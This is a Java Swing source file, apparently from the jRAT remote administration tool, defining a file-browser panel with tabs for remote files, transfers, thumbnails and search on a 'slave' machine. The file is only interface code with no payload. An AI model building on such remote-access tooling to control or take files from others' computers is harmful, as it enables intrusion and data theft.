package jrat.module.fs.ui;

import jrat.api.Resources;
import jrat.api.ui.ClientPanel;
import jrat.controller.Slave;
import jrat.controller.ui.panels.PanelFileTransfers;
import jrat.module.fs.ui.previews.PreviewPanel;

import javax.swing.*;
import java.awt.*;
import java.util.HashMap;
import java.util.Map;

@SuppressWarnings("serial")
public class PanelFileSystem extends ClientPanel {

    /**
     * All file previewing handlers
     */
    private final Map<Object, PreviewPanel> previewHandlers = new HashMap<>();

    private JTabbedPane tabbedPane;
	private PanelFileManager remoteFiles;
	private PanelSearchFiles searchPanel;
	private PanelThumbView thumbPanel;

	public PanelFileSystem(Slave slave) {
		super(slave, "File Browser", Resources.getIcon("folder-tree"));

		setLayout(new BorderLayout(0, 0));

		remoteFiles = new PanelFileManager(slave, this);
		
		searchPanel = new PanelSearchFiles(slave, this);
		thumbPanel = new PanelThumbView(slave);
		
		tabbedPane = new JTabbedPane();
		tabbedPane.addTab("Files", Resources.getIcon("folder-tree"), remoteFiles);
		tabbedPane.addTab("Transfers", Resources.getIcon("arrow-down"), PanelFileTransfers.instance);
		tabbedPane.addTab("Thumbnails", Resources.getIcon("images-stack"), thumbPanel);
		tabbedPane.addTab("Search", Resources.getIcon("folder-search"), searchPanel);
		
		add(tabbedPane, BorderLayout.CENTER);	
	}

    /**
     *
     * @param key
     * @param preview
     */
	void addPreview(Object key, PreviewPanel preview) {
	    previewHandlers.put(key, preview);
	    tabbedPane.addTab(preview.title, preview.icon, preview);
    }

    public PreviewPanel getPreviewHandler(Object key) {
        return previewHandlers.get(key);
    }

    public PanelFileManager getFilesPanel() {
		return remoteFiles;
	}

	public PanelSearchFiles getSearchPanel() {
		return searchPanel;
	}
	
	public PanelThumbView getThumbPanel() {
		return thumbPanel;
	}
	
	public void setTab(Component tab) {
		tabbedPane.setSelectedComponent(tab);
	}

}
